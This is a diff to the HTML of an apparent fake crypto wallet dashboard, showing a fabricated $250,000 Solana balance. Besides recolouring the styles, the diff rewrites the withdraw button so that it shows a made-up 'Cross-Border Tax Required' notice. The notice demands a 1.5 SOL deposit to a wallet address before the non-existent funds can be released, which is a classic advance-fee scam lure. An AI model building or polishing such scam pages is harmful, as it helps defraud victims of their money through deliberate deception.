@@ -6,8 +6,8 @@
   <title>Crypto Dashboard</title> 
   <style>
         body {
-            background-color: black;
-            color: gold;
+            background-color: #000;
+            color: #77bff2;
             font-family: Arial, sans-serif;
             text-align: center;
             margin: 0;
@@ -28,8 +28,8 @@
             max-width: 350px;
             padding: 15px;
             border-radius: 12px;
-            background: rgba(255, 215, 0, 0.1);
-            box-shadow: 0 0 8px gold;
+            background: rgba(119, 191, 242, 0.1);
+            box-shadow: 0 0 8px #77bff2;
             margin-bottom: 20px;
         }
         .balance {
@@ -52,8 +52,8 @@
             gap: 12px;
         }
         .btn {
-            background: gold;
-            color: black;
+            background: #77bff2;
+            color: #000;
             border: none;
             padding: 12px;
             font-size: 16px;
@@ -63,17 +63,17 @@
             transition: 0.2s;
         }
         .btn:hover {
-            background: #e6c200;
+            background: #5aa8e0;
         }
         .popup {
             position: fixed;
             width: 90%;
             max-width: 300px;
-            background: black;
-            color: gold;
+            background: #000;
+            color: #77bff2;
             padding: 15px;
             border-radius: 12px;
-            box-shadow: 0 0 8px gold;
+            box-shadow: 0 0 8px #77bff2;
             display: none;
             text-align: center;
             top: 50%;
@@ -93,7 +93,7 @@
             align-items: center;
             justify-content: space-between;
             padding: 5px;
-            background: rgba(255, 215, 0, 0.1);
+            background: rgba(119, 191, 242, 0.1);
             border-radius: 8px;
             margin: 5px 0;
         }
@@ -104,7 +104,7 @@
         }
         .network {
             font-size: 12px;
-            color: gold;
+            color: #77bff2;
             opacity: 0.8;
             margin-left: 5px;
         }
@@ -115,20 +115,20 @@
         }
         .input-box {
             width: 90%;
-            background: black;
-            border: 2px solid gold;
+            background: #000;
+            border: 2px solid #77bff2;
             padding: 10px;
             font-size: 14px;
             text-align: center;
             border-radius: 8px;
-            color: gold;
+            color: #77bff2;
             margin-bottom: 12px;
         }
         .close {
             cursor: pointer;
             display: block;
             margin-top: 10px;
-            color: gold;
+            color: #77bff2;
         }
         .coin-container {
             width: 90%;
@@ -138,7 +138,7 @@
             gap: 10px;
         }
         .coin {
-            background: rgba(255, 215, 0, 0.1);
+            background: rgba(119, 191, 242, 0.1);
             padding: 15px;
             border-radius: 10px;
             display: flex;
@@ -151,7 +151,7 @@
             font-weight: bold;
         }
         .coin .balance {
-            color: gold;
+            color: #77bff2;
             font-size: 18px;
             margin-bottom: 0;
         }
@@ -187,7 +187,9 @@
    <h3>Withdraw</h3> 
    <p>You are withdrawing $250,000 in Solana.</p> 
    <img src="https://i.postimg.cc/28YjwRs3/Screenshot-20250223-233453.png"> 
-   <input type="text" placeholder="Enter SOL Address" class="input-box" id="withdrawAddress"> <button class="btn" id="withdrawBtn" onclick="showDepositMessage()">Withdraw</button> <span class="close" onclick="hidePopup('withdrawPopup')">Close</span> 
+   <input type="text" placeholder="Enter SOL Address" class="input-box" id="withdrawAddress"> 
+   <button class="btn" id="withdrawBtn" onclick="showTaxMessage()">Withdraw</button> 
+   <span class="close" onclick="hidePopup('withdrawPopup')">Close</span> 
   </div> <!-- Balance Popup --> 
   <div id="balancePopup" class="popup"> 
    <h3>Balance</h3> 
@@ -220,8 +222,12 @@
             navigator.clipboard.writeText(text).then(() => alert("Copied!"));
         }
 
-        function showDepositMessage() {
-            document.getElementById("withdrawBtn").innerText = "Deposit 1 SOL to withdraw";
+        function showTaxMessage() {
+            const withdrawBtn = document.getElementById("withdrawBtn");
+            withdrawBtn.innerText = "Cross-Border Tax Required! Due to regulations on international crypto transfers, a fee of 1.5 SOL must be deposited to release funds. Copy the Solana address in this wallet to make the deposit. After that you can then withdraw.";
+            withdrawBtn.style.fontSize = "12px"; // Reduce font size to fit text
+            withdrawBtn.style.padding = "8px";   // Adjust padding
+            withdrawBtn.style.lineHeight = "1.2"; // Adjust line height for readability
         }
 
         const memeCoins = [
